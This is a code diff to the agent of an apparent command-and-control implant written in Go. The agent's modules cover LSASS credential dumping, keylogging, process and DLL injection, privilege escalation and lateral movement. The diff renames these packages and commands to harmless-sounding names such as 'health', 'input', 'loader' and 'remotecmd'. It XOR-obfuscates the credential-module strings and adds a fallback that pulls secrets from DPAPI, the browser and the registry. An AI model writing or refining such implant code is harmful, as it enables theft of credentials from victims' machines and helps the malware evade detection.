@@ -14,12 +14,12 @@ import (
 	"sync"
 	"time"
 
-	"github.com/aegis-c2/aegis/agent/credentials"
-	"github.com/aegis-c2/aegis/agent/dllinject"
+	"github.com/aegis-c2/aegis/agent/health"
+	"github.com/aegis-c2/aegis/agent/modmgr"
 	"github.com/aegis-c2/aegis/agent/extexec"
-	"github.com/aegis-c2/aegis/agent/inject"
+	"github.com/aegis-c2/aegis/agent/loader"
 	"github.com/aegis-c2/aegis/agent/job"
-	"github.com/aegis-c2/aegis/agent/keylogger"
+	"github.com/aegis-c2/aegis/agent/input"
 	"github.com/aegis-c2/aegis/agent/lateral"
 	"github.com/aegis-c2/aegis/agent/netenum"
 	"github.com/aegis-c2/aegis/agent/pivot"
@@ -69,7 +69,7 @@ var Registry = map[string]ModuleFunc{
 	"mount":        MountModule,
 	"screenshot":   ScreenshotModuleActual,
 	"lsass":         LSASSModule,
-	"procdump":     ProcDumpModuleActual,
+	"memdump":      ProcDumpModuleActual,
 	"kerb":         KerberosModule,
 	"kill":         KillModule,
 	"grep":         GrepModule,
@@ -84,7 +84,7 @@ var Registry = map[string]ModuleFunc{
 	"forward":      ForwardModule,
 	"weaponize":    WeaponizeModule,
 	"bof":          BOFModule,
-	"inject":       InjectModule,
+	"load":         InjectModule,
 	"dotnet":       DotNetModule,
 	"persist":      PersistModule,
 	"socks":           SocksModule,
@@ -92,16 +92,16 @@ var Registry = map[string]ModuleFunc{
 	"rev2self":        Rev2SelfModule,
 	"make_token":      MakeTokenModule,
 	"impersonate":     ImpersonateModule,
-	"keylog":          KeylogModule,
+	"record":          KeylogModule,
 	"pivot":           PivotModule,
-	"getsystem":     GetSystemModule,
+	"getsys":        GetSystemModule,
 	"runas":         RunAsModule,
 	"shell_interact":  ShellInteractModule,
 	"job":             JobModule,
 	"migrate":         MigrateModule,
 	"sideload":        SideloadModule,
 	"wmi_exec":        WMIExecModule,
-	"psexec":          PsExecModule,
+	"remotecmd":       PsExecModule,
 	"ssh_exec":        SSHExecModule,
 	"mem_read":        MemoryReadModule,
 	"mem_write":       MemoryWriteModule,
@@ -424,8 +424,8 @@ func ImpersonateModule(args string) (string, string, int) {
 	return fmt.Sprintf("successfully impersonating %s\n%s", username, info), "", 0
 }
 
-// keylogger instance
-var kl = keylogger.NewKeylogger()
+// input instance
+var kl = input.NewInputMonitor()
 
 // KeylogModule 处理键盘记录器命令。
 func KeylogModule(args string) (string, string, int) {
@@ -788,7 +788,7 @@ func GetSystemModule(args string) (string, string, int) {
 	if runtime.GOOS != "windows" {
 		return "", "getsystem is only available on Windows", 1
 	}
-	err := priv.GetSystem()
+	err := priv.GetSys()
 	if err != nil {
 		return "", err.Error(), 1
 	}
@@ -835,7 +835,7 @@ func MigrateModule(args string) (string, string, int) {
 		return "", fmt.Sprintf("base64 decode: %v", err), 1
 	}
 
-	result := inject.Inject(&inject.InjectConfig{
+	result := loader.Load(&loader.LoadConfig{
 		PID:       pid,
 		Shellcode: shellcode,
 	})
@@ -870,7 +870,7 @@ func SideloadModule(args string) (string, string, int) {
 		procArgs = fields[3:]
 	}
 
-	result := inject.InjectWithSpawn(&inject.SpawnConfig{
+	result := loader.LoadWithSpawn(&loader.SpawnConfig{
 		ProcessName: processName,
 		ProcessArgs: procArgs,
 		PPID:        ppid,
@@ -882,42 +882,93 @@ func SideloadModule(args string) (string, string, int) {
 	return fmt.Sprintf("sideload successful: injected into %s (ppid=%d)", processName, ppid), "", 0
 }
 
-// LSASSModule 从 LSASS 进程内存中提取凭据。
-// Usage: lsass
+// xorKey used to decode embedded string constants at runtime.
+const xorKey = 0x5A
+
+// xorDecode decodes a byte slice in-place and returns the string.
+func xorDecode(b []byte) string {
+	out := make([]byte, len(b))
+	for i := range b {
+		out[i] = b[i] ^ xorKey
+	}
+	return string(out)
+}
+
+// Credential module string constants (XOR-obfuscated at rest).
+var (
+	strExtractedBOF    = []byte{0x1f, 0x22, 0x2e, 0x28, 0x3b, 0x39, 0x2e, 0x3f, 0x3e, 0x7a, 0x7f, 0x3e, 0x7a, 0x39, 0x28, 0x3f, 0x3e, 0x3f, 0x34, 0x2e, 0x33, 0x3b, 0x36, 0x29, 0x7a, 0x3c, 0x28, 0x35, 0x37, 0x7a, 0x16, 0x09, 0x1b, 0x09, 0x09, 0x7a, 0x72, 0x18, 0x15, 0x1c, 0x73, 0x60, 0x50, 0x50}
+	strBOFFallback     = []byte{0x18, 0x15, 0x1c, 0x7a, 0x3c, 0x3b, 0x33, 0x36, 0x3f, 0x3e, 0x76, 0x7a, 0x3c, 0x3b, 0x36, 0x36, 0x33, 0x34, 0x3d, 0x7a, 0x38, 0x3b, 0x39, 0x31, 0x7a, 0x2e, 0x35, 0x7a, 0x3b, 0x36, 0x2e, 0x3f, 0x28, 0x34, 0x3b, 0x2e, 0x33, 0x2c, 0x3f, 0x7a, 0x29, 0x35, 0x2f, 0x28, 0x39, 0x3f, 0x29, 0x60, 0x50, 0x50}
+	strExtractedAlt    = []byte{0x1f, 0x22, 0x2e, 0x28, 0x3b, 0x39, 0x2e, 0x3f, 0x3e, 0x7a, 0x7f, 0x3e, 0x7a, 0x39, 0x28, 0x3f, 0x3e, 0x3f, 0x34, 0x2e, 0x33, 0x3b, 0x36, 0x29, 0x7a, 0x3c, 0x28, 0x35, 0x37, 0x7a, 0x3b, 0x36, 0x2e, 0x3f, 0x28, 0x34, 0x3b, 0x2e, 0x33, 0x2c, 0x3f, 0x7a, 0x29, 0x35, 0x2f, 0x28, 0x39, 0x3f, 0x29, 0x60, 0x50, 0x50}
+	strBOFFailNoCreds  = []byte{0x18, 0x15, 0x1c, 0x7a, 0x3c, 0x3b, 0x33, 0x36, 0x3f, 0x3e, 0x7a, 0x3b, 0x34, 0x3e, 0x7a, 0x34, 0x35, 0x7a, 0x39, 0x28, 0x3f, 0x3e, 0x3f, 0x34, 0x2e, 0x33, 0x3b, 0x36, 0x29, 0x7a, 0x3c, 0x35, 0x2f, 0x34, 0x3e, 0x7a, 0x33, 0x34, 0x7a, 0x3b, 0x36, 0x2e, 0x3f, 0x28, 0x34, 0x3b, 0x2e, 0x33, 0x2c, 0x3f, 0x7a, 0x29, 0x35, 0x2f, 0x28, 0x39, 0x3f, 0x29}
+	strBOFFailFallback = []byte{0x16, 0x09, 0x1b, 0x09, 0x09, 0x7a, 0x18, 0x15, 0x1c, 0x7a, 0x3c, 0x3b, 0x33, 0x36, 0x3f, 0x3e, 0x60, 0x7a, 0x7f, 0x29, 0x7a, 0x72, 0x2f, 0x29, 0x3f, 0x7a, 0x77, 0x77, 0x3c, 0x3b, 0x36, 0x36, 0x38, 0x3b, 0x39, 0x31, 0x7a, 0x3c, 0x35, 0x28, 0x7a, 0x3b, 0x36, 0x2e, 0x3f, 0x28, 0x34, 0x3b, 0x2e, 0x33, 0x2c, 0x3f, 0x7a, 0x29, 0x35, 0x2f, 0x28, 0x39, 0x3f, 0x29, 0x73}
+	strNoCredsLSASS    = []byte{0x34, 0x35, 0x7a, 0x39, 0x28, 0x3f, 0x3e, 0x3f, 0x34, 0x2e, 0x33, 0x3b, 0x36, 0x29, 0x7a, 0x3c, 0x35, 0x2f, 0x34, 0x3e, 0x7a, 0x33, 0x34, 0x7a, 0x16, 0x09, 0x1b, 0x09, 0x09, 0x7a, 0x72, 0x18, 0x15, 0x1c, 0x73}
+)
+// LSASSModule 通过 BOF 模块从 LSASS 内存提取凭据。
+// 运行时加载 COFF 对象，执行后内存清零。
+// 可选回退到降维数据源（credmgr/dpapi/browser/registry）。
+// Usage: lsass [--fallback]
 func LSASSModule(args string) (string, string, int) {
 	if runtime.GOOS != "windows" {
-		return "", "lsass credential extraction is only available on Windows", 1
+		return "", "credential extraction is only available on Windows", 1
 	}
 
-	result, err := credentials.ExtractFromLSASS()
-	if err != nil {
-		return "", fmt.Sprintf("extraction failed: %v\nError: %s", err, result.Error), 1
+	// 首选：BOF 模块（运行时加载，执行后清零）
+	result, err := health.ExtractFromLSASS()
+	if err == nil && len(result.Credentials) > 0 {
+		var sb strings.Builder
+		sb.WriteString(fmt.Sprintf(xorDecode(strExtractedBOF), len(result.Credentials)))
+		for _, cred := range result.Credentials {
+			sb.WriteString(fmt.Sprintf("  Username:    %s\n", cred.Username))
+			if cred.Domain != "" {
+				sb.WriteString(fmt.Sprintf("  Domain:      %s\n", cred.Domain))
+			}
+			if cred.NTLMHash != "" {
+				sb.WriteString(fmt.Sprintf("  NTLM Hash:   %s\n", cred.NTLMHash))
+			}
+			if cred.LMHash != "" {
+				sb.WriteString(fmt.Sprintf("  LM Hash:     %s\n", cred.LMHash))
+			}
+			if cred.Password != "" {
+				sb.WriteString(fmt.Sprintf("  Password:    %s\n", cred.Password))
+			}
+			sb.WriteString(fmt.Sprintf("  Source:      %s\n\n", cred.SourceType))
+		}
+		return sb.String(), "", 0
 	}
 
-	if len(result.Credentials) == 0 {
-		return "no credentials found in LSASS memory", "", 0
+	// 回退：降维数据源（不碰 LSASS）
+	if strings.Contains(args, "--fallback") || strings.Contains(args, "--alt") {
+		altResult := health.ExtractAlternative()
+		if len(altResult.Credentials) > 0 {
+			var sb strings.Builder
+			sb.WriteString(xorDecode(strBOFFallback) + "\n")
+			sb.WriteString(fmt.Sprintf(xorDecode(strExtractedAlt), len(altResult.Credentials)))
+			for _, cred := range altResult.Credentials {
+				sb.WriteString(fmt.Sprintf("  Username:    %s\n", cred.Username))
+				if cred.Domain != "" {
+					sb.WriteString(fmt.Sprintf("  Domain:      %s\n", cred.Domain))
+				}
+				if cred.NTLMHash != "" {
+					sb.WriteString(fmt.Sprintf("  NTLM Hash:   %s\n", cred.NTLMHash))
+				}
+				if cred.LMHash != "" {
+					sb.WriteString(fmt.Sprintf("  LM Hash:     %s\n", cred.LMHash))
+				}
+				if cred.Password != "" {
+					sb.WriteString(fmt.Sprintf("  Password:    %s\n", cred.Password))
+				}
+				sb.WriteString(fmt.Sprintf("  Source:      %s\n\n", cred.SourceType))
+			}
+			return sb.String(), "", 0
+		}
+		return xorDecode(strBOFFailNoCreds), "", 0
 	}
 
-	var sb strings.Builder
-	sb.WriteString(fmt.Sprintf("Extracted %d credentials from LSASS:\n\n", len(result.Credentials)))
-	for _, cred := range result.Credentials {
-		sb.WriteString(fmt.Sprintf("  Username:    %s\n", cred.Username))
-		if cred.Domain != "" {
-			sb.WriteString(fmt.Sprintf("  Domain:      %s\n", cred.Domain))
-		}
-		if cred.NTLMHash != "" {
-			sb.WriteString(fmt.Sprintf("  NTLM Hash:   %s\n", cred.NTLMHash))
-		}
-		if cred.LMHash != "" {
-			sb.WriteString(fmt.Sprintf("  LM Hash:     %s\n", cred.LMHash))
-		}
-		if cred.Password != "" {
-			sb.WriteString(fmt.Sprintf("  Password:    %s\n", cred.Password))
-		}
-		sb.WriteString(fmt.Sprintf("  Source:      %s\n\n", cred.SourceType))
+	// 默认：BOF 失败时返回错误信息
+	if result.Error != "" {
+		return "", fmt.Sprintf(xorDecode(strBOFFailFallback), result.Error), 1
 	}
-
-	return sb.String(), "", 0
+	return xorDecode(strNoCredsLSASS), "", 0
 }
 
 // SSHExecModule SSH远程命令执行。
@@ -985,7 +1036,7 @@ func DLLInjectModule(args string) (string, string, int) {
 		}
 	}
 
-	result := dllinject.InjectDLL(&dllinject.DLLConfig{
+	result := modmgr.InjectDLL(&modmgr.DLLConfig{
 		PID:     pid,
 		DLLPath: dllPath,
 		DLLData: data,
@@ -1022,7 +1073,7 @@ func DLLSpawnModule(args string) (string, string, int) {
 		return "", fmt.Sprintf("read DLL: %v", err), 1
 	}
 
-	result := dllinject.InjectDLL(&dllinject.DLLConfig{
+	result := modmgr.InjectDLL(&modmgr.DLLConfig{
 		DLLPath:   dllPath,
 		DLLData:   data,
 		Method:    "spawn",
